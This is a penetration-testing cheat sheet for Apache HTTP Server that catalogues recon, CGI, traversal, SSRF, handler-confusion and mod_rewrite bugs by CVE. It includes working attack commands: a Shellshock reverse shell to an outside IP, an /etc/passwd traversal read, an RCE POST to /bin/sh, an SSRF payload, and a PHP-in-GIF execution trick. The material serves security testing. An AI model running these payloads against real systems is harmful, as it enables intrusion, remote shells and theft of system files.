# Apache HTTP Server (httpd)

**TL;DR**: `mod_status`/`mod_info` for free recon, `mod_cgi` for Shellshock and CVE-2021-41773/42013-style path traversal, `mod_rewrite` for a whole family of substitution/encoding bugs (Orange Tsai's "Confusion Attacks" batch is the single richest CVE cluster here). Handler confusion (Content-Type-driven internal handler invocation) is the deep-cut technique worth understanding once, since it explains several otherwise-unrelated-looking bugs.

## 1. Fingerprinting / recon

* `Server:` header (`ServerTokens Full` leaks OS + module versions, `ServerTokens Prod` hides them, check anyway since misconfig is common).
* Default error pages leak version unless `ServerSignature Off`.
* `server-status` and `server-info` (mod_status / mod_info, see section 2) are the richest recon sources if exposed.

## 2. mod_status / mod_info exposure

```
/server-status
/server-status?full
/server-info
```

`server-status` in particular can leak: internal IPs, other vhosts, requested URLs of other users' in-flight requests (potentially containing session tokens/credentials in query strings), and general traffic patterns. `server-info` gives a full config dump (loaded modules, per-module config) but does **not** list `.htaccess` directives. Absence of a rule in `server-info` doesn't mean a directory is unprotected, since `.htaccess` can override it. If you can upload/edit an `.htaccess` and `AllowOverride FileInfo` is permitted, `mod_status`/`mod_info` become interesting again since you can point `SetHandler` at them yourself even if they're not globally enabled.

`server-status` can also be abused for SSRF: setting `Content-Type: server-status` in certain proxy/handler-confusion contexts combined with a `Location:` header starting with `/` has been documented as an internal-handler invocation trick (see Handler Confusion, section 8).

## 3. CGI (mod_cgi / mod_cgid)

```
/cgi-bin/
```

**Shellshock (CVE-2014-6271 and related CVE-2014-6277/78/6271/7169)**: if a CGI script (Perl, shell, or anything invoked through Bash) is reachable and Bash is vulnerable, arbitrary command injection via a crafted `User-Agent` (or any header CGI exposes as an environment variable):

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://target/cgi-bin/admin.cgi
```

Metasploit: `exploit/multi/http/apache_mod_cgi_bash_env_exec`. Detect with `nikto -C all` or by fingerprinting an old Apache + `mod_cgi` (cgi-bin folder present).

**RFC 3875 Local Redirect abuse**: a CGI script can return a `Location:` header with a local path+query (no scheme/host), which tells Apache to internally reprocess the request against that new path. This can be abused to reach otherwise-unreachable internal handlers (see Handler Confusion, section 8) if the CGI script's redirect target is attacker-influenced.

**PATH_INFO / PATH_TRANSLATED**: per RFC 3875, everything after the CGI script path in the URL is exposed to the script as `PATH_INFO`, and some servers derive a filesystem-looking `PATH_TRANSLATED` from it. Worth testing for path traversal or unexpected file access if the CGI script uses either value unsafely.

**DoS**: Slowloris-style attacks remain relevant against CGI-heavy or thread-limited configs; low-and-slow partial-header connections exhaust the worker pool.

## 4. Path traversal / RCE via encoding (CVE-2021-41773 / CVE-2021-42013)

Apache 2.4.49 introduced a broken path-normalization routine: encoding `../` as `.%2e/` (URL-encoding just the middle dot) bypassed traversal checks because the normalization function decoded percent-encoded values one at a time and failed to recognize `%2e` as `.` in that context.

```bash
# Path traversal / arbitrary file read (requires an Alias'd/aliasable path, e.g. cgi-bin)
curl --path-as-is "http://target/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# RCE if mod_cgi is enabled for the aliased path (POST with a command)
curl --path-as-is -d 'echo Content-Type: text/plain; echo; id; uname' \
  "http://target/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

2.4.50 shipped an incomplete fix (CVE-2021-42013), still bypassable with an extra encoding layer. Only 2.4.49 and 2.4.50 are affected; requires a directory outside the webroot to be reachable via an `Alias`-style directive, and (for RCE) `mod_cgi` enabled and pointing at a shell-invoking path (non-default but historically common, e.g. default `cgi-bin` alias present in many distro configs).

## 5. mod_proxy SSRF (CVE-2021-40438)

Unauthenticated SSRF in `mod_proxy` (≤ 2.4.48) via a crafted request URI-path containing `unix:`, which causes the proxy to forward the request to an attacker-chosen origin server (including internal-only hosts, or a Unix socket path):

```
curl -v "http://target/?unix:$(python3 -c 'print("A"*4096)')|http://internal-host:8080/" -d foo=bar
```

Requires `mod_proxy` enabled (common when Apache fronts an app server). CVSS 9.0, actively exploited historically. Useful against internal services/metadata endpoints reachable only from the Apache host itself, though cloud metadata endpoints are often independently protected.

## 6. Handler confusion / Content-Type driven handler invocation

If an attacker can influence the `Content-Type` of a response Apache itself processes internally (via a backend app, a misconfigured proxy response, or a CGI local-redirect as in section 3), arbitrary internal module handlers can potentially be invoked. This is the mechanism behind abusing `server-status` via `Content-Type: server-status` plus a same-path `Location:` redirect, and behind reaching `mod_proxy` to hit arbitrary protocols/URLs (X-Forwarded-For is added by Apache in this path, which blocks reaching cloud metadata endpoints directly in many setups, but internal non-metadata hosts remain reachable). Also documented: reaching PHP-FPM's local Unix domain socket this way to execute a planted PHP backdoor in `/tmp/`, and abusing the official PHP Docker image's bundled `pearcmd.php` for RCE via this class of bug (see "Docker PHP LFI to RCE" writeups).

This bug class has a dedicated CVE batch from Orange Tsai's 2024 Black Hat research, all fixed in 2.4.60, worth checking by version alone before deeper testing:

* **CVE-2024-38474**: substitution encoding issue in `mod_rewrite`, encoded question marks in backreferences let an attacker execute scripts in directories permitted by config but never directly reachable by URL, or disclose source of scripts meant to run only as CGI.
* **CVE-2024-38475**: output escaping weakness in `mod_rewrite` when a backreference or variable is the first segment of a substitution, allows unauthorized access to restricted files, in some cases RCE without authentication. Actively exploited in the wild, added to CISA KEV.
* **CVE-2024-38476**: Apache can be made to use exploitable/malicious backend application output to invoke local handlers via internal redirect, the core Handler Confusion primitive described above, formalized as its own CVE.
* **CVE-2024-38473**: proxy encoding problem, request URLs with non-standard encoding get forwarded to backend services unmodified, potentially bypassing authentication logic that expected normalized input.
* **CVE-2024-39573**: SSRF in `mod_rewrite` when substitutions configured outside `ProxyPass`/`ProxyPassMatch`/`RewriteRule [P]` (e.g. via `SetHandler` or an unintended proxy trigger) are used, including via `.htaccess`.

Reference: [Orange Tsai: "Confusion Attacks" (2024)](https://blog.orange.tw/2024/08/confusion-attacks-en.html) is the canonical modern writeup of this bug class across Apache's handler/module resolution logic, and the primary source for the CVE batch above.

## 7. AddType / legacy handler mapping regressions (CVE-2024-39884 / CVE-2024-40725)

`AddType application/x-httpd-php .php`-style legacy content-type-based handler configuration, still common in older configs, was found to leak PHP source code instead of executing it when files are requested **indirectly** rather than directly (via internal rewrite, local redirect, or an `ErrorDocument` chain reaching the same script). This was a regression in 2.4.60/2.4.61 (CVE-2024-40725) from an incomplete fix of CVE-2024-39884, fixed in 2.4.62.

```bash
grep -RInE 'AddType\s+application/x-httpd-php|AddType\s+.*x-httpd' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

If found, compare a direct request to the PHP file against any indirect path reaching the same script (rewrite/redirect/ErrorDocument), looking for the response suddenly coming back as `text/plain`/`text/html` (source disclosure) instead of executed output.

## 8. .htaccess-based tricks

* **ErrorDocument arbitrary file read**: if a directory's `.htaccess` is attacker-controllable (upload, misconfigured write access) and `AllowOverride FileInfo` is permitted, Apache 2.4's expression parser (`ap_expr`, enabled by default) can be abused inside `ErrorDocument` with the `file()` function to turn any 404 into an arbitrary local file read, provided the Apache worker user has read permission on the target file.
* **Auth bypass via `<Files>` blocks**: review `.htaccess`/vhost `<Files>` directives for gaps, e.g. protecting `admin.php` but not `Admin.php`/`admin.PHP` on case-insensitive filesystems, or protecting the exact filename but not an aliased/rewritten path reaching the same script.

## 9. mod_rewrite pitfalls

**Rewrite target traversal**: a `RewriteRule` that substitutes a captured group directly into a filesystem path without anchoring/validating it can be escaped:

```apache
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"
```

```
curl http://server/user/orange/secret.yml?
# → serves /var/user/orange/secret.yml instead of profile.yml
```

**Extension/handler smuggling via `[H=...]`**: a rewrite rule that force-assigns a handler based on a regex match can be abused if the matched path is something an attacker controls (e.g. an uploaded filename):

```apache
RewriteEngine On
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
```

```bash
# Attacker uploads a .gif containing PHP code
curl http://server/upload/1.gif      # served as-is: GIF89a <?=`id`;>
# Access via a path matching the rewrite's .php pattern
curl "http://server/upload/1.gif?ooo.php"
# → executed as PHP: uid=33(www-data) gid=33(www-data)
```

**SSRF via mod_rewrite on Windows (part of the 2.4.62 advisory)**: SSRF in server/vhost-context `mod_rewrite` on Windows can leak NTLM hashes to an attacker-controlled server via a crafted request, fixed in 2.4.62.

## 10. mod_ssl TLS upgrade desync (CVE-2025-49812)

Configurations using `SSLEngine optional` to allow opportunistic TLS upgrade on a connection are vulnerable to an HTTP desynchronization attack during the upgrade process, allowing a man-in-the-middle to hijack an active session and impersonate a legitimate user. Fixed by removing TLS-upgrade support entirely in 2.4.64. Check for `SSLEngine optional` in any vhost as a config smell even without directly testing the desync.

## 11. Range header DoS (CVE-2011-3192)

Sending many overlapping/fragmented `Range:` header values against a large static file forces Apache to build many small compressed chunks in memory simultaneously, exhausting memory/CPU (the "Apache Killer" DoS). Old but still worth a mention/check on unpatched legacy installs; mitigated by limiting or disabling multi-range requests (`mod_headers` rule to strip/limit Range on large files).

## 12. MultiViews / content negotiation info disclosure

If `mod_negotiation`'s `MultiViews` option is enabled, requesting a resource without its extension can let Apache content-negotiate and disclose the existence of files with unexpected extensions in that directory (e.g. `.php.bak`, `.php.orig`, language-suffixed variants left by editors/backups). Useful for discovering backup/source files that a direct extension guess would have missed.

## 13. Expect / header-based request smuggling considerations

As with any front-end/back-end pairing, test CL.TE/TE.CL smuggling patterns whenever Apache proxies to a second HTTP hop (`mod_proxy`, `mod_proxy_fcgi`, `mod_jk`/`mod_proxy_ajp` in front of Tomcat). The smuggling potential comes from a parsing disagreement between the two hops rather than from Apache being individually non-compliant.

**h2c smuggling**: if Apache forwards `Upgrade`/`Connection` headers to an h2c-compatible backend through `mod_proxy`, an attacker can establish a cleartext HTTP/2 tunnel through Apache directly to the backend, bypassing Apache's own path-based routing, auth, and WAF logic for subsequent requests on that tunnel. Tool: `h2csmuggler`.

## 14. WebDAV (mod_dav)

If `mod_dav`/`mod_dav_fs` is enabled and write access is misconfigured, the same PUT-based upload logic as any other webapp applies: test `PUT`/`MKCOL`/`PROPFIND`/`COPY`/`MOVE` against writable locations for arbitrary file upload, and check whether an uploaded script-extension file gets executed by a co-located handler (PHP/CGI) rather than served statically.

---

## CVEs to check

* **CVE-2021-41773** / **CVE-2021-42013**: path traversal, and RCE if `mod_cgi` is enabled, via broken percent-encoding normalization. Affects 2.4.49 (41773) and 2.4.50's incomplete fix (42013) only, but both were exploited in the wild as 0-days.
* **CVE-2021-40438**: unauthenticated SSRF via `mod_proxy` and a crafted `unix:` request URI-path. Affects ≤ 2.4.48, CVSS 9.0.
* **CVE-2024-39884**: source-code disclosure via legacy `AddType`-based handler config under certain indirect request paths.
* **CVE-2024-40725**: incomplete fix of CVE-2024-39884, regression in 2.4.60/2.4.61, fixed in 2.4.62.
* **CVE-2024-38474**: substitution encoding issue in `mod_rewrite`, encoded question marks in backreferences allow executing scripts in directories permitted by config but never directly reachable by URL, or disclosing source of scripts meant to run only as CGI.
* **CVE-2024-38475**: output escaping weakness in `mod_rewrite` when a backreference or variable is the first segment of a substitution, allows unauthorized access to restricted files, in some cases RCE without authentication. Actively exploited in the wild, in CISA KEV.
* **CVE-2024-38476**: Apache can be made to use exploitable/malicious backend application output to invoke local handlers via internal redirect (the Handler Confusion primitive, see section 6).
* **CVE-2024-38473**: proxy encoding problem, request URLs with non-standard encoding get forwarded to backend services unmodified, potentially bypassing authentication logic that expected normalized input.
* **CVE-2024-39573**: SSRF in `mod_rewrite` when substitutions configured outside `ProxyPass`/`ProxyPassMatch`/`RewriteRule [P]` (e.g. via `SetHandler`, including via `.htaccess`) are used.
* **CVE-2024-38477**: NULL pointer dereference serving WebSocket protocol upgrades over an HTTP/2 connection, crashes the worker process (DoS).
* **SSRF via `mod_rewrite` on Windows leaking NTLM hashes**: fixed in 2.4.62 alongside the AddType regression (see section 7), part of the same release's advisory batch.
* **CVE-2025-49812**: HTTP desync during opportunistic TLS upgrade (`SSLEngine optional`) in `mod_ssl`, session hijacking risk, fixed by removing TLS-upgrade support in 2.4.64.
* **CVE-2011-3192**: Range header memory-exhaustion DoS ("Apache Killer").
* **CVE-2014-6271** and related (**CVE-2014-6277**, **CVE-2014-6278**, **CVE-2014-7169**): Shellshock, RCE via Bash environment-variable injection when Apache invokes CGI/Bash-backed scripts.

---

## Caido
- `server-status`/`server-info` exposure is a one-shot GET in Replay, check both before anything else.
- Shellshock and CGI PATH_INFO probes: set the crafted `User-Agent` in Replay and fire at every discovered `/cgi-bin/*.cgi` path from HTTP History.
- CVE-2021-41773/42013 path traversal: build the encoded-traversal request once in Replay (`--path-as-is` equivalent is just not double-encoding it in the URL bar), then vary the target file per request.
- mod_rewrite/AddType regressions need a direct-vs-indirect comparison, send the same target script two ways (direct URL, then via any discovered rewrite/redirect/ErrorDocument chain) and diff the Content-Type/body of the two responses.

## References

* [HackTricks - Apache](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html): server-status/server-info abuse, handler confusion, AddType regressions, ErrorDocument file-read via .htaccess.
* [HackTricks - CGI](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html): Shellshock payloads, PATH_INFO/PATH_TRANSLATED abuse, FastCGI pivot.
* [Orange Tsai: "Confusion Attacks" (2024)](https://blog.orange.tw/2024/08/confusion-attacks-en.html): canonical writeup of Apache handler-resolution confusion bugs.
* [Official Apache HTTP Server 2.4 vulnerability list](https://httpd.apache.org/security/vulnerabilities_24.html): authoritative, version-indexed CVE list, check first for anything post-dating this cheatsheet.
* [ExploitDB PoC: CVE-2021-41773/42013](https://www.exploit-db.com/exploits/50383)
* nikto (`-C all`) for CGI/Shellshock/known-file discovery.
* [h2csmuggler](https://github.com/BishopFox/h2csmuggler): h2c smuggling tool for bypassing mod_proxy routing/auth rules (section 13).
